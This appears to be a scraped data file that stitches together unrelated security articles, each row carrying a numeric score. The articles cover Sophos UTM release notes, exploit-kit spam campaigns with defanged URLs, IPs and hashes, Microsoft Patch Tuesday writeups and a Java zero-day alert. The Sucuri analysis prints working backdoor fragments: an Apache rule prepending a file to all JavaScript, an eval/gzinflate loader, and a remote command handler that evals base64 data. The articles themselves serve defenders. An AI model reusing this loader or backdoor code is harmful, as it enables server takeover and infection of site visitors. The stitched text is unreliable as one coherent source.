30800 [BETA] Some double byte characters aren’t filtered by DLP custom rule and AntiSpam Expressions filter.
31083 Remote SSL VPN view is empty in printable configuration
31340 rsyncd not started after switching to master mode (slave node hangs in syncing state)
31387 ad-sid-sync.pl is executed even if AD sync is disabled
31534 Wrong date in executive report
31581 Up2date pattern rpm’s fails to install if hostname contains ‘/’ character.
31859 Make http proxy handle uncompressed DNS responses
32034 Full transparent AD SSO redirect URL request gets dropped by packetfilter
32079 UMTS modem device hanging
32097 High load after pattern installation [9.2]
32190 Policy tester always returns “allowed” if warn page is proceeded once
32391 UMTS interface doesn’t come up again after the speed changed from 4G to 3G
32433 Not possible to delete VPN tunnel managed by SUM after use “cleanup object”
32537 Guest login fails in transparent browser auth mode if “terms of use” confirmation is required
32552 Quarantined mail will be quarantine again after release with the same reason
32588 Can’t restore backup beacause of an undefined value
32602 Web control policy not applying to endpoints
32604 Special characters like umlauts didn’t work in passwords with reverse authentication for the WAF
32607 Not possible to use virtual mac on lag interfaces
32683 Can’t send a VPN Profile to the SMC if the Organization Name includes a umlaut
32690 It’s not possible to use Subfolders for Remote Log File Archives over SMB on CIFS share
32696 Hotspot: only one login possible per username for backend authentication hotspot
32703 Multicast traffic problems after upgrading to SG430 and 9.204
32711 Mail preview should display kyrilic or chinese chars too.
32713 Console keyboard doesn’t work
32726 Dashboard does not show Antivirus active protocols for HTTP/S
32794 vpn-reporter.pl segfault in get_amazonvpc
32805 NETDEV WATCHDOG: eth0 (tg3): transmit queue 0 timed out
32832 Remote Syslog Server IPv6 support
32837 vpn-reporter.pl segfaults, error 4 in libc-2.11.3.so
32851 Device auth reports wrong client information
32852 Any SSL traffic through HTTP proxy gets classified as “Sophos Portal” if a “Sophos Portal” AppCtrl rule exists
32870 ad-sid-sync.pl fails to lookup trusted domains groups
32940 SG550: Licensing does not work if module is relocated after installation
32950 Configuring a whitelist in webfilter filter action appears in blacklist on UTM
32957 winbindd died in kernel_vsyscall
32969 Coredumps from reverseproxy after update to v9.206
32972 IPS exception does not work for SID 18575
32980 Remove RC4 from TLS ciphers in Exim
33019 After upgrading to iOS 8 UTM does not recognize iOS anymore (Device-specific Authentication)
33111 Group matching incorrect if user belongs to static and backend groups
33277 [9.2] Add support for passthrough NTLM connection
33307 Not possible to change TLS certificate
33323 Using @ in hostname results in corrupt /etc/syslog-ng.conf
33382 Config changes in IPsec remote access sometime causing a drop of established connections
33429 AP100: Unable to authenticate with an SSID using a PSK with a dollar character
33515 SMTP Vulnerability in SSL v3.0
33516 POP3 Vulnerability in SSL v3.0
33613 OS X HTTPS traffic identified as iOS
33690: HTTP responses which contain malware and are delivered with “Content-Encoding: deflate” are not caught by virus scanners",0.009714201268237743
"Up2date link:
ftp://ftp.astaro.de/UTM/v9/up2date/u2d-sys-9.209008-210020.tgz.gpg",0.010202101411069475
"Up2date MD5sum:
9489592f7b7bfbe44071e29bf7e3f851",0.009714138327578281
"File size:
≈120MB",0.0080979100018026
"Up2Date Installation:
Sophos Up2Date technology makes it easy to upgrade your Sophos UTM to the latest version.
There are two ways to apply an already-downloaded Up2Date package to the system:",0.013772033919475235
"Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.011976908437992817
Sophos UTM Up2Date FTP Mirrors:,0.007242273332700666
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the UTM V9 features you should post it on our User Bulletin Board. Please indicate the version you are using to help us (and everyone helping you).
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
You are free to use our new demo server environment without hassle, nags, or registration. Enjoy!",0.015233574152306972
"Eric Bégoc
Senior Product Manager",0.010102162674290538
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Over the past 24 hours, cybercriminals launched two consecutive massive email campaigns, impersonating Intui Payroll’s Direct Deposit Service system, in an attempt to trick end and corporate users into clicking on the malicious links found in the mails.
Upon clicking on any of links found in the emails, users are exposed to the client-side exploits served by the latest version of the Black Hole exploit kit.
More details:",0.0142534049594214
Sample screenshot of the first spamvertised campaign:,0.010254077489689206
"Upon clicking on the links found in the malicious emails, users are exposed to the following bogus “Page loading…” screen:",0.011262076246338681
Screenshots of the second spamvertised campaign:,0.010174571071701055
"Sample spamvertised compromised URLs:
hxxp://www.partypromgowns.com/wp-content/plugins/zaddmuruxhm/prdiqbss.html
hxxp://whitfordmedical.co.nz/wp-content/plugins/zoaddiyefar/prdiqbss.html
hxxp://hanvietroll.com/components/com_ag_google_analytics2/itordernote.html
hxxp://aprst.com/components/com_ag_google_analytics2/croconfrm.html
Sample client-side exploit serving URLs:
hxxp://art-london.net/detects/stones-instruction_think.php
hxxp://buycelluleans.com/detects/groups_him.php
hxxp://buycelluleans.com/detects/groups_him.php?zgdljis=3833043409&lkaqagg=0636060a350838350b06&pfat=03&ayna=rapcdmse&zvyhcimn=yecbbs
hxxp://art-london.net/detects/stones-instruction_think.php?lwkmvtb=3533020635&qbstxmw=43&cvsd=0b0a33350a0735020405&stbdtv=0a000300040002
Both of these malicious domains use to respond to 183.81.133.121; 195.198.124.60; 203.91.113.6. More malicious domains part of the campaign’s infrastructure are known to have responded to the same IPs, for instance, buzziskin.net; addsmozy.net; buycelluleans.com; indice-acores.net. The campaign used to rely on the following name servers: ns1.zikula-support.com; ns2.zikula-support.com
Sample client-side exploits served: CVE-2010-0188
Upon successful client-side exploitation, the campaign drops MD5: 5723f92abf257101be20100e5de1cf6f and MD5: 06c6544f554ea892e86b6c2cb6a1700c on the affected hosts.
Related analysis of malicious campaigns impersonating Intuit:",0.010467318885642007
"Intuit themed ‘QuickBooks Update: Urgent’ emails lead to Black Hole exploit kit
Cybercriminals impersonate Intuit Market, mass mail millions of exploits and malware serving emails
Spamvertised Intuit themed emails lead to Black Hole exploit kit",0.009987636018921164
"Detection rate, MD5: 5723f92abf257101be20100e5de1cf6f – detected by 17 out of 43 antivirus scanners as Gen:Variant.Kazy.96378; Worm.Win32.Cridex.js, MD5: 06c6544f554ea892e86b6c2cb6a1700c – detected by 26 out of 43 antivirus scanners as Trojan.Win32.Buzus.mecu; Worm:Win32/Cridex.B
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.010103812328778883
Apache PHP Injection to JavaScript Files,0.007404611423893814
"We have been talking about Apache server-side injections for a while. Ranging from malicious modules, like Darkleech, to modified Apache binaries. From an attacker perspective, it is much more lucrative to inject their malicious code at that level, instead of having to compromise each site on the server individually.
However, server-side injections are not only limited to Apache modules or binaries. They can also be done via global .htaccess injections and PHP auto appends/preppends, which we will cover in this article.",0.008052608815834139
"Auto Prepend JavaScript Files
PHP has an interesting configuration option called “auto_prepend_file”. It allows administrators to include a file to be automatically parsed before the requested content is executed. Malware authors have been using this option at the site level for a while by modifying the .htaccess file. However, in this instance, they got root access and modified the file /etc/httpd/conf.d/php.conf with the following:",0.012250743346015613
"<files ~ "".js$”>
AddHandler php5-script .js
php_value auto_prepend_file /usr/share/php/a.control.bin
php_flag display_errors Off
</files>",0.009065341558267881
"The syntax is very simple and it basically treats every JavaScript as PHP and prepends the content of /usr/share/php/a.control.bin to all JavaScript files. By modifying the Apache configuration they can inject it on every site hosted on the server.
Injected content
The file being prepended (a.control.bin) when first inspection was not a normal PHP file. It seemed like an encoded executable and testing on VirusTotal (an engine that checks a file against all 47 major anti virus products), resulted in a0/47 detection rate. It meant the file was never found before and needed more analysis.
We started to work with the binary and were able to partially decode it. The attackers were using gzip, along with multiple intermixed comments to add useless functions and make it hard to decode:",0.009001950543562565
"/* posix_mknod ()	;	jdtojewish) ; gzgetss(imagesetbrush(); mb_stripos */;
eval/*mcrypt_generic	(	)    ;",0.013594892279963577
"In the code mentioned above, none of those functions were not called except for the eval. When we thought it was using mcrypt or posix_mknod, it was just a distraction for the eval part. We also got our ESET friends to help with it. They were able to decode and decrypt the file and found many levels of obfuscation. From their explanation:
The PHP script uses comments to add junk, it can be reduced to the following: The function __halt_compiler() will stop the parsing of the script before the binary data embedded in the file. It will then be read and decompressed with gzinflate and evaled:
<?php
$__ = __FILE__ ;
eval (gzinflate(file_get_contents($__ ,null, null, (__COMPILER_HALT_OFFSET__))));
__halt_compiler();
BINARY_CODE",0.01203731119871343
They also found an interesting backdoor that connects to google-analytcs.com with the user agent “SEX/1”. This allows the malware owners to control the server and execute commands via eval or add any file to the server. These are the commands the malware authors can run:,0.008603974147150195
"case “OK”: touch($___[""file”]); break;
case “EXEC”: eval ( base64_decode ($___ [""data”][1])); break;
case “UPDATE”: file_put_contents ($__,base64_decode($___[""data”][1])); break;
case “ERROR”: default: touch($__,(time()+$___[""failed_period”])); break;",0.01704527926834054
"Another interesting thing is that when you decode the file, the first line starts with:",0.010258394231533963
/ * Hey ! How did you find me ? 😛 */,0.011904250791510806
"Yes, took a bit, but we did find you. You can see the full payload on PHP decoder.
Browser Injection
All that encoding is used to do 2 things: Act as a backdoor for the attackers to maintain their access to the server and inject malware on the browser of the visitors to the site. And inject malware they did. Every time a JavaScript file was requested, the following code would be prepended to it:",0.011636091780829139
This code once executed by the browser calls multiple iFrames:,0.005115237524131455
"httx://weymouthsmiles.com/wuwu.html
httx://weymouthsmiles.com/wqlc.html
httx://www.blog-hits.com/b1.php?id=ballsofsteel",0.011191612698377318
"These are used to redirect the browser to the infamous Redkit Exploit Kit (hxxp://weymouthsmiles.com/jo.jar – Trojan.Java/Exploit.CVE-2013-2423.BM).
It also loads an image from http://google-analytcs.com/domain/ga.gif so the attackers can track the compromised sites and clients.
Conclusion
This is just another technique the attackers are using to maintain access to the servers they compromise, and to inject malware, in this case, to the Redkit Exploit Kit. Note that this is not new and we have been seeing cases like this for a while. Tony Perez even talked about it before on a previous post.
Again, thanks to the ESET team for the help here.
",0.010190096701711338
Frag out: four remote attack bugs fixed in Microsoft’s February Patch Tuesday,0.008513380401459325
Three TCP/IP bugs and a flaw in Microsoft's DNS server could be leveraged to crash systems or remotely execute code.,0.012187677981908784
"Written by
SophosLabs Offensive Security,",0.009602756231350207
Sean Gallagher,0.00965173899218752
"February 09, 2021",0.010051908674040488
SophosLabs Uncut Threat Research 2021-02 CVE-2021-1732 CVE-2021-24074 CVE-2021-24078 CVE-2021-24086 CVE-2021-24094 Patch Tuesday tcpip.sys,0.011903991517019152
"Microsoft’s second monthly security update release of 2021 addresses 56 newly-identified vulnerabilities in the Windows operating system and other products, nine of them designated as critical. But the relatively small number of vulnerabilities doesn’t lessen the importance of the February Patch Tuesday fixes—especially since, once again, one of them is actively being exploited.
That bug, CVE-2021-1732, is a privilege escalation vulnerability in Windows’ Win32k.sys. Even though it’s actively being exploited, 1732 is not the most urgent of February’s fixes—even though it would be ample enough reason on its own to patch. Four network-based vulnerabilities are potentially much more dangerous, and rated by Microsoft as being more likely to be exploited.  Some of them could potentially be exploited in an attack across the Internet.
Bad Packets
Three separate bugs in Windows’ TCP/IP networking stack are addressed in the latest patch release. The first, CVE-2021-24074, is a remote code execution bug in Windows systems’ handling of inbound IPv4 packets. An attacker could exploit this bug by crafting traffic using two IPv4 protocol features:",0.011160253045375934
"IP fragmentation: the option to “break” a packet into multiple packet fragments. When all fragments are received, they are reassembled back into a single packet on the endpoint.
Loose Source and Record Route (LSRR):  LSRR is an archaic IPv4 header option that implements “Source Routing”, a way for packets to request routers to choose and record the path through which the network will route them.",0.014026273822596913
"For the bug to be exploited, both of these features of IPv4 have to be used at the same time—something that would (almost) never happen accidentally. Crafted packets using both features could cause the Windows TCP/IP driver (tcpip.sys) to confuse the internal data structures of the individual packet fragments and those of the reassembled packet. This can cause the driver to read memory outside the boundaries of an internal buffer (an “out-of-bounds read”  condition); with a crafted set of packets, this could lead to an out-of-bounds write condition that could corrupt memory in a way that leads to remote code execution.
This is particularly dangerous, since the vulnerable code is running in the context of a Windows Kernel driver—if successfully exploited, the attacker could execute code with kernel-level privileges. The good news is that remote exploitation of this bug may be thwarted by default by many firewalls and routers. The LSRR option has long been considered insecure because it could be leveraged for address spoofing, and packets containing it are often filtered out of Internet traffic. The bug could still be delivered over less complex local area networks, however, so patching the vulnerability should still be given a high priority.
The two other TCP/IP vulnerabilities revealed in February’s release are related to fragmented packets as well—but in these cases, they’re IPv6 packets.
The more severe of the two is CVE-2021-24094, a bug that is triggered when Windows’ tcpip.sys performs a “recursive reassembly” on fragmented packets. Under certain circumstances, the reassembly process can cause  a dangling pointer condition — with the driver leaving open a pointer to memory space that has been de-allocated that can be exploited to remotely execute code.
The second IPv6 bug, CVE-2021-24086, also occurs during fragmented packet reassembly. In this case, however, the vulnerability is triggered by a large volume of  extension headers in the fragmented packets.  If the bug is successfully triggered, a NULL pointer dereference occurs, crashing the kernel and the Windows system with it, yielding a Blue Screen of Death.
Microsoft did not indicate whether the two bugs can be triggered over the Internet or if they are limited to being exploited on LAN networks only.
It’s always DNS
Another network-based vulnerability fixed in February’s security patches, CVE-2021-24078, is a bug in Windows DNS Server that could result in remote code execution. This one is definitely exploitable from the Internet, but requires an especially coordinated level of evil to execute. The attacker would have to cause a query to the DNS server for a domain it hasn’t seen before, resulting in a query to a root DNS server. The attacker would then have to spoof the response before it could be returned by the actual root DNS server.
Because the attacker needs to be able to spoof the root server’s response before the real response comes back, the greatest threat of attacks exploiting this bug will come from a threat inside the local network, where packet spoofing is more feasible. But because DNS is based on UDP, the attack could potentially be executed over the Internet.
Other bugs of note",0.012938858770639161
"The remaining eight critically-rated vulnerabilities are less likely to be exploited quickly, but all involve potential remote code execution.  Two are in the .NET Core SDK—one in the Windows and Visual Studio SDK (CVE-2021-26701), and the other (CVE-2021-24112) in the software developer kit for Linux.
CVE-2021-1722 and CVE-2021-24077 are both vulnerabilities in Windows’ Fax Service, which had another, unrelated remote code execution bug patched in January.  The Windows Graphics Component is another feature patched this month (CVE-2021-24093) that also had a vulnerability fixed in January—albeit an information disclosure one). And Windows’ Print Spooler, which had an elevation of privilege vulnerability in January, is patched again this month for RCE (CVE-2021-24088).
Two others (CVE-2021-24088 and CVE-2021-24091) are in Windows codecs associated with image and video handling—the first in Windows’ Codecs Library, and the second in the WIndows Camera Codec Pack. These can be used in remote code execution attacks using a crafted image or video file—a recurring type of vulnerability.
Beyond those marked as “critical” by Microsoft, there are 10 more remote code execution vulnerabilities patched in the February bug fix release. One of them (CVE-2021-24072) is in SharePoint server; since it’s a network-based vulnerability, Microsoft has rated it as more likely to be exploited.",0.008580365936706191
"Sophos protection
Here is a list of protection released by SophosLabs in response to this advisory to complement any existing protection and generic exploit mitigation:",0.009347294015578878
"CVE
IPS",0.008419728173823637
"CVE-2021-24072
SID:2304915",0.010216482784710212
"CVE-2021-24074
SID:2304906",0.01046483302486545
"CVE-2021-24078
SID:2304905",0.010805090692484143
"Sophos aims to add detections for critical issues, based on the type and nature of the vulnerabilities, as soon as possible and where we have been given sufficient information to be able to do so. In many cases, existing detections in endpoint products (such as Intercept X) will catch and block exploit attempts without the need for updates.",0.009465787478096788
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"2
",0.012344956490214498
Virtual Patching for Websites with Sucuri CloudProxy,0.00994249233024802
"All software has bugs, and some bugs can lead to security vulnerabilities. Vulnerabilities can be extremely dangerous when your software is running over the web, allowing anyone to reach and try to attack it. That’s why patching and keeping web applications updated is so important.
The reality is there is no shortage of websites running outdated Joomla installs, or outdated WordPress, or name your favorite CMS. There are also plenty of websites running themes/templates with known vulnerabilities, or forgotten plugins that are being exploited in the wild. The #1 excuse for keeping these web applications outdated is that their websites will break.
We often hear things like “My theme was heavily modified, so I can’t update it”, or “I am afraid it will break some functionality if I update this plugin”, or “I modified core files so now I am stuck”, or even “My web developer left us and nobody knows how this piece of code works”.",0.010937219831303135
"If you are in this situation where you can’t update your web software (from CMS’s, to plugins, modules or themes), this CVE list will probably will scare you:
CVE-2012-6527 XSS Cross-site scripting (XSS) vulnerability in the My Calendar plugin before 1.10.2 for WordPress allows remote attackers to inject arbitrary web script or HTML via the PATH_INFO.
CVE-2012-5868 INFO WordPress 3.4.2 does not invalidate a wordpress_sec session cookie upon an administrator’s logout action, which makes it easier for remote attackers to discover valid session identifiers via a brute-force attack, or modify data via a replay attack.
CVE-2012-4448 CSRF Cross-site request forgery (CSRF) vulnerability in wp-admin/index.php in WordPress 3.4.2 allows remote attackers to hijack the authentication of administrators for requests that modify an RSS URL via a dashboard_incoming_links edit action.
CVE-2012-4422 Bypass wp-admin/plugins.php in WordPress before 3.4.2, when the multisite feature is enabled, does not check for network-administrator privileges before performing a network-wide activation of an installed plugin, which might allow remote authenticated users to make unintended plugin changes by leveraging the Administrator role.
CVE-2012-4421 Bypass The create_post function in wp-includes/class-wp-atom-server.php in WordPress before 3.4.2 does not perform a capability check, which allows remote authenticated users to bypass intended access restrictions and publish new posts by leveraging the Contributor role and using the Atom Publishing Protocol (aka AtomPub) feature.
CVE-2012-4271 XSS Multiple cross-site scripting (XSS) vulnerabilities in bad-behavior-wordpress-admin.php in the Bad Behavior plugin before 2.0.47 and 2.2.x before 2.2.5 for WordPress allow remote attackers to inject arbitrary web script or HTML via the (1) PATH_INFO, (2) httpbl_key, (3) httpbl_maxage, (4) httpbl_threat, (5) reverse_proxy_addresses, or (6) reverse_proxy_header parameter.
CVE-2013-1455 Leak Joomla! 3.0.x through 3.0.2 allows attackers to obtain sensitive information via unspecified vectors related to an “Undefined variable.”
CVE-2013-1453 – SQL injection – plugins/system/highlight/highlight.php in Joomla! 3.0.x through 3.0.2 and 2.5.x through 2.5.8 allows attackers to unserialize arbitrary PHP objects to obtain sensitive information, delete arbitrary directories, conduct SQL injection attacks, and possibly have other impacts via the highlight parameter. Note: it was originally reported that this issue only allowed attackers to obtain sensitive information, but later analysis demonstrated that other attacks exist.
CVE-2012-5455 XSS Cross-site scripting (XSS) vulnerability in the language search component in Joomla! before 3.0.1 allows remote attackers to inject arbitrary web script or HTML via unspecified vectors, related to a “typographical error.”
CVE-2012-2991 – The PayPal (aka MODULE_PAYMENT_PAYPAL_STANDARD) module before 1.1 in osCommerce Online Merchant before 2.3.4 allows remote attackers to set the payment recipient via a modified value of the merchant’s e-mail address, as demonstrated by setting the recipient to one’s self.
CVE-2012-2935 Cross-site scripting (XSS) vulnerability in osCommerce/OM/Core/Site/Shop/Application/Checkout/pages/main.php in OSCommerce Online Merchant 3.0.2 allows remote attackers to inject arbitrary web script or HTML via the value_title parameter, a different vulnerability than CVE-2012-1059.
The scary thing is this is just a small number of the CVE’s released for WordPress, Joomla and osCommerce over the past few months.
Web site virtual patching
According to OWASP, virtual patching is defined as:
The term virtual patching was originally coined by Intrusion Prevention System (IPS) vendors a number of years ago. It is not a web application specific term, and may be applied to other protocols however currently it is more generally used as a term for Web Application Firewalls (WAF). It has been known by many different names including both External Patching and Just-in-time Patching. Whatever term you choose to use is irrelevant. What is important is that you understand exactly what a virtual patch is:
A security policy enforcement layer which prevents the exploitation of a known vulnerability.
The virtual patch works since the security enforcement layer analyzes transactions and intercepts attacks in transit, so malicious traffic never reaches the web application. The resulting impact of virtual patch is that, while the actual source code of the application itself has not been modified, the exploitation attempt does not succeed.
Virtual patching affords websites that are outdated (or with known vulnerabilities) to be protected from attacks by preventing exploitation of these vulnerabilities on the fly. This is usually done by either a firewall or intrusion detection system.
Sucuri CloudProxy – WAF+IDS
To assist our customers with proactive security measures we have created a Web Application Firewall (WAF) plus Intrusion Detection System (IDS) named Sucuri CloudProxy. It is an in-the-middle proxy that sits between your websites and the internet allowing us to filter and block attacks before they reach your websites.
CloudProxy, which is currently in open beta to our customers, will patch known vulnerabilities and also adds multiple layers of hardening/prevention, along with log analysis to prevent websites from being hacked, infected with malware, or reinfected.
Here are a few of the features you’ll find in CloudProxy:",0.009929402964184209
"Traffic Filtering – blocks malicious requests
Virtual Patching
WAF (Web application firewall) – Prevents SQL injections, XSS, RFI, etc
IDS/IPS (Intrusion Detection/Prevention System)
Extended Access Control (whitelisting of IP’s allowed to access administrative pages)
OSSEC HIDS Integration (Full log analysis and traffic monitoring)
Improved Performance and Caching
Fully Managed in the Cloud",0.027554303963932436
"If you have questions about virtual patching, or the Sucuri CloudProxy service, email us at info@sucuri.net and we can get you setup.
",0.014396591788784052
"Improved Fallout EK comes back after short hiatus
[Edit 2019-01-24] Fallout EK introduces a new dropper to facilitate the final payload retrieval. This update replaces the plain MZ we saw for a little while.",0.00962106660534301
"—
After a short hiatus in early January, the Fallout exploit kit is back in business again with some new features for the new year. During its absence, we noticed an increase in RIG EK campaigns, perhaps to fill that temporary void.
Fallout EK is distributed via malvertising chains (one of them we track under the name HookAds), especially through adult traffic. Since January 15, Fallout EK activity has been picking up pace again to deliver the GandCrab ransomware.
The revised Fallout EK boasts several new features, including integration of the most recent Flash Player exploit. Security researcher Kafeine identified that Fallout is now the second exploit kit to add CVE-2018-15982.
Fallout EK 2019 highlights:",0.012734626356684764
"HTTPS support
New landing page format
New Flash exploit (CVE-2018-15982)
Powershell to run payload",0.008351176963765305
One aspect that caught our attention was how Fallout was delivering its payload via Powershell rather than using iexplore.exe. This was also mentioned in the EK developer’s advert reposted by Kafeine on his site.,0.010972851098641656
The Base64 encoded Powershell command calls out the payload URL and loads it in its own way:,0.007705991725447836
"This technique is most likely an attempt at evasion, as traditionally we’d expect the Internet Explorer process to drop the payload.
[ Edit: 2019-01-18] This technique is to bypass the Antimalware Scan Interface (AMSI) in Windows 10, which offers additional protection at the last stage of an attack. As described by @nao_sec.
What this new development tells us is that exploit kit developers are still monitoring the scene for new exploits and techniques. In 2018, several zero-days for Internet Explorer and Flash Player were found and turned into easily adaptable proof of concepts. Even though the market share for IE and Flash continues to drop, there are many countries still running older systems where the default browser is Internet Explorer. Therefore, threat actors will take advantage.
Malwarebytes users are already protected against this updated Fallout EK.",0.010843907586128965
"Indicators of Compromise
185.56.233[.]186,advancedfeed[.]pro,HookAds Campaign",0.008906959533012793
"51.15.35[.]154,payformyattention[.]site,Fallout EK
",0.008878773003632157
"On a regular basis we profile various DIY (do it yourself) releases offered for sale on the underground marketplace with the idea to highlight the re-emergence of this concept which allows virtually anyone obtaining the leaked tools, or purchasing them, to launch targeted malware attacks.
Can DIY exploit generating tools be considered as a threat to the market domination of Web malware exploitation kits? What’s the driving force behind their popularity? Let’s find out by profiling a tool that’s successfully generating an exploit (CVE-2013-0422) embedded Web page, relying on malicious Java applets.
More details:",0.012729309624874618
Sample screenshot of the DIY exploit generating tool:,0.008509769050576765
Second screenshot of the DIY exploit generating tools in action:,0.007891756138069361
"To use it, a cybercriminal submits a URL and the tool will embeds the exploit based on their preferences. The Web page then functions as a foundation for a successful social engineering attempt. The options provide the ability to choose a URL pointing to a malicious executable, define what happens once the exploitation takes place, and the name of the malicious Java applet.
DIY client-side exploits embedding tools aren’t new however; despite their popularity, they fail to achieve the efficiency levels offered by modern and systematically updated Web malware exploitation kits. What they make fairly easy to accomplish is to empower a potential cybercriminal with an extremely easy to use point’n’click tool, to assist them in targeted malware campaigns.
We’ll continue to monitor the re-emergence of the DIY cybercrime ecosystem market concept, and post updates as soon as new tools and services become available for cybercriminals to take advantage of.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on Twitter.
",0.012835771131476936
"Microsoft knocks out 114 vulnerabilities in May, 2020 Patch Tuesday",0.010656462951937007
Bugs in Windows services and various browser components tamped down before they could be exploited,0.006060166384000754
"Written by
SophosLabs Offensive Security",0.008622298185940958
"May 12, 2020",0.008787038803026004
SophosLabs Uncut Threat Research 2020-05 BITS Chain of Fools ChakraCore Microsoft Patch Tuesday Windows,0.00921375283495629
"(Editor’s note: This article was updated on May 13, 2020 to include additional detections in the table at the end of the post.)
In what has become a tradition, the second Tuesday of every month Microsoft releases security updates to Windows and other products. This month’s release fixes a total of 114 vulnerabilities, among which 17 are classified as Critical, and 93 as Important.
A total of 28 potential remote code execution (RCE) vulnerabilities have been fixed in Windows web components (such as the Edge or Internet Explorer browsers, or the ChakraCore Javascript engine), the Jet engine, and some Office components. Moreover, 56 local privilege escapation (LPE) bugs were also fixed, in the Windows kernel (mostly in Win32k, DirectX, or GDI) and also in some Windows services (such as Push Notification, Windows Error Reporting, and BITS).
As usual all the additional details can be found in the Security Update Guide Release Notes and users can download patches manually from the Microsoft Security Update Catalog.
Adobe usually times its updates to coincide with Microsoft, and this month release saw 21 bugs patched, all in their Acrobat Reader. With a criticality set as “Important,” all the bugs fixed classify as memory corruption vulnerabilities (null pointer, out-of-bound read, use-after-free) which can potentially lead to code execution on this victim’s host simply by opening a PDF document.
SophosLabs has investigated some of the more interesting vulnerabilities Microsoft fixed this month. Here are some highlights.
Windows Graphic Components
CVE-2020-1054,CVE-2020-1143
CVE-2020-0915,CVE-2020-0916,CVE-2020-0963,CVE-2020-1141,CVE-2020-1142,CVE-2020-1145
CVE-2020-1135,CVE-2020-1153
The graphic layers of Windows span many complex technologies, and therefore make up a huge attack surface. Attackers frequently look at these subsystems for vulnerabilities. This month, Microsoft fixed a total of 10 vulnerabilities affecting these core components, with risks going from simple kernel information leaks, up to local Elevation of Privilege (EoP).
One of the EoP vulnerabilities that stands out the most this month is CVE-2020-1054. This bug describes an out-of-bound write found in the syscall win32k!NtDrawIconEx,  which is responsible for drawing an icon into a specific handle of device context (HDC). Due to its very nature, any unprivileged Win32 application can invoke such a syscall, and therefore potentially elevate to SYSTEM.
In any case, one must bear in mind that, in order to be exploited, those bugs require access to a Windows graphical session, and also need to be able to execute code.
Web Browser memory corruption
CVE-2020-1037,CVE-2020-1056,CVE-2020-1059,CVE-2020-1096, CVE-2020-1062,CVE-2020-1092,CVE-2020-1093
ChakraCore, the JavaScript engine that powers the Edge web browser, suffers from multiple memory corruption  vulnerabilities.
If successfully exploited, these vulns could allow a remote attacker to execute code on the targeted host with the current user’s privilege simply by exposing a carefully crafted web page and either wait for a victim (or forcing them) to visit the page though XSS, CSRF, or OpenRedirect web vulnerabilities—or even through social engineering tricks.
Several vulnerabilities were also found in Internet Explorer 11 and VB scripting engine. Such vulnerabilities could also be exploited successfully as they rely on old (in some cases, unsupported) technologies, and cannot benefit from the protections modern browsers offer users.
Windows Services
CVE-2020-1084, CVE-2020-1123, CVE-2020-1137, CVE-2020-1081
Windows services are a great avenue for bugs, particularly (but not only) filesystem bugs – most notably by abusing symbolic links and junctions. As they require high privileges to run, successful exploitation of Windows services usually result in privilege escalation.
This month, Microsoft issued fixes for Windows services, such as:",0.015904000553982667
"Connected User Experiences and Telemetry Service
Background Intelligent Transfer Service (BITS)
Push Notifications
Printing",0.013304997163287036
"have also been targeted, and their vulnerabilities fixed in the April, 2020 Patch Tuesday. Many more bugs in Windows services were fixed this month, any of which could have potentially resulted in EoP. However, the company provided us with no technical details.
Although no vulnerability was reported as exploited in the wild, many vulnerabilities are rated as very likely to be exploited. Therefore, the simple precaution principle would dictate to patch as soon as possible, which is, regardless of any other layer of protection, always the best remediation.
How is Sophos responding to these threats?
Here is a list of protection released by SophosLabs in response to this advisory to complement any existing protection and generic exploit mitigation capabilities in our products.",0.010120550995860511
CVE,0.015603552773460372
SAV,0.007429604172777826
IPS,0.010146075287656875
"CVE-2020-1058
Exp/20201058-A
SID:90001093",0.010751263940083078
"CVE-2020-1060
Exp/20201060-A
SID:90001094",0.01126018404844209
CVE-2020-1062,0.009858949165547637
SID:90001095,0.008275094859016674
"CVE-2020-1135
Exp/20201135-A",0.010846284827555674
CVE-2020-1153,0.010004439814943367
SID:35483,0.007946023189550067
"How long does it take to have Sophos detection in place?
We aim to add detection to critical issues based on the type and nature of the vulnerabilities as soon as possible. In many cases, existing detections will catch exploit attempts without the need for updates.
What if the vulnerability/0-day you’re looking for is not listed here?
If we haven’t released an update for a specific exploit, the most likely reason is that we did not receive the data that shows how the exploit works in the real world. As many of this month’s exploits were crafted in a lab and have not been seen in the wild, nobody has enough information (yet) about how criminals would, hypothetically, exploit any given vulnerability. If or when we receive information about real attacks, we will create new detections, as needed.",0.0103922475117596
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"1
",0.011966970221767848
CTA: New Java Zero-Days,0.009363951360588652
"Update: Oracle has addressed the exploit known as CVE-2013-1493 with an emergency patch.  You can read about this patch on Oracle’s blog here.
URGENT:
A few days ago we heard about yet another zero-day in Oracle Java from security firm FireEye.  The exploit targets java versions 6 and 7.  Details are on the company’s malware blog.
Fireeye reports new Java zero-day",0.014533001267429957
"ACTION:
Unfortunately, a patch has not been released by Oracle.  Users should disable java in their browsers using the following instructions (courtesy of Sophos):",0.006476108292941429
"Disable Java in Internet Explorer
Disable Java in Firefox
Disable Java in Chrome
Disable Java in Safari
Disable Java in Opera",0.012854106479856298
"DETAILS:
Oracle has yet to release any official statement, but a webpage has already been dedicated on their website to this issue, documented as CVE-2013-1493.
Fireeye as well as other sources confirm the exploit is not very reliable, and oftentimes results in a crash of the Java Virtual Machine (JVM).  This same vulnerability has also been attributed to the Bit9 security breach discovered in January by the company, where the company’s security certificates were stolen.In addition, Polish researchers from a firm known as Security Explorations have also discovered two separate zero-days documented by Oracle as Issue 54 and 55.  Both of these have been submitted to Oracle, but Issue 54 was confirmed by the company as “allowed behavior”.
Security Explorations records communication with Oracle concerning exploits.
It’s been a pretty bad start for Java this year, with Oracle addressing over 50 security holes released in two patches.  With a long history of the software’s exploitation and no foreseeable end, consumers might want to consider discontinuing the use of java altogether unless absolutely necessary.
_______________________________________________________________________________
